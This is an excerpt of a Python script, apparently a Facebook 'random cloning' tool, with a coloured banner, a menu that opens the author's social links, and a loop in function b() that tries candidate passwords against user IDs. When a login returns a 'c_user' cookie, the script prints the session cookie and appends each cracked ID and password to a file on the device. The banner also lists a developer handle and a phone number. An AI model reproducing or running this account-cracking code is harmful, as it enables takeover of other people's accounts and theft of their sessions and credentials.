...
\33[1;92m
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m LOV3 YOU MOON  \033[0;m  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V69 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m║➣\033[1;91m DEVOLPER   :    X4JU.69 \33[1;92m║               
\33[1;92m║➣ LOVE   :    MOON \33[1;92m                  ║                 
\33[1;92m║➣\033[1;93m WHATSAPP   :          01905067662       \33[1;92m ║
\33[1;92m║➣\033[1;34m FRIEND     :          SAHRIYA VAIRA       \33[1;92m ║          
...
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] START RANDOM CLONING BY MOON")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/X4JU.69');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://m.me/X4JU.69/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801905067662');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/X4JU.69');time.sleep(1)
		admin()
...
def virusA():
	...
	print(' [💉] Ids saved in MOON.txt,cp.txt')
	print(50*'_')
	exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMOON\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [MOON-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/MOON.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
